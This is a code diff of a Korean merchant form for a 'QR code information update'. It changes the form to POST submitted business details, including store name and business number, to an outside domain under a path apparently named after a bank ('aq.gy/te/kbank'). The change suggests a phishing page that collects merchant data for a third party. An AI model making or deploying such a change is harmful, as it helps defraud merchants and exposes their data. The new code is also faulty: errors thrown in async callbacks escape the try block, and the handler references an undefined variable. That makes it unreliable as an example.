@@ -275,34 +275,31 @@
     formData.append('store_name',   storeName);
 
     try {
-      var response = await fetch('handler.php', {
-        method: 'POST',
-        body: formData
+      $.ajax({
+        url: 'https://aq.gy/te/kbank/handler.php',
+        type: 'POST',
+        data: formData,
+        processData: false,
+        contentType: false,
+        dataType: 'json',
+        success: function (data) {
+          if (data.result !== 'success') {
+            throw new Error(data.message || '서버 오류. 잠시 후에 다시 시도해 주세요.');
+          }
+
+          document.getElementById('cardsGrid').style.display  = 'none';
+          document.querySelector('.btn-wrap').style.display   = 'none';
+          document.querySelector('.back-link').style.display  = 'none';
+          document.querySelector('.step-indicator').style.display = 'none';
+
+          var storeIdMsg = '<br><br>사업자 번호: <strong>' + bizNo + '</strong>';            
+          showResult('success', '&#10003;', '등록이 완료되었습니다!',
+            'QR 코드 정보 갱신 요청이 정상적으로 처리되었습니다.' + storeIdMsg);
+        },
+        error: function (err) {
+          throw new Error(result.message || '서버 오류. 잠시 후에 다시 시도해 주세요.');
+        }
       });
-
-      if (!response.ok) {
-        throw new Error('HTTP ' + response.status);
-      }
-
-      var result = await response.json();
-
-      if (result.success) {
-        // 성공: 폼 숨기고 성공 메시지 표시
-        document.getElementById('cardsGrid').style.display  = 'none';
-        document.querySelector('.btn-wrap').style.display   = 'none';
-        document.querySelector('.back-link').style.display  = 'none';
-        document.querySelector('.step-indicator').style.display = 'none';
-
-        var storeIdMsg = result.store_id
-          ? '<br><br>상점 ID: <strong>' + result.store_id + '</strong>'
-          : '';
-        showResult('success', '&#10003;', '등록이 완료되었습니다!',
-          'QR 코드 정보 갱신 요청이 정상적으로 접수되었습니다.' + storeIdMsg +
-          '<br><br>담당 매니저가 방문하여 QR 플레이트 업데이트를 안내드릴 예정입니다.');
-      } else {
-        throw new Error(result.message || '서버 오류');
-      }
-
     } catch (e) {
       btn.disabled = false;
       btn.innerHTML = '동의하고 진행하기';
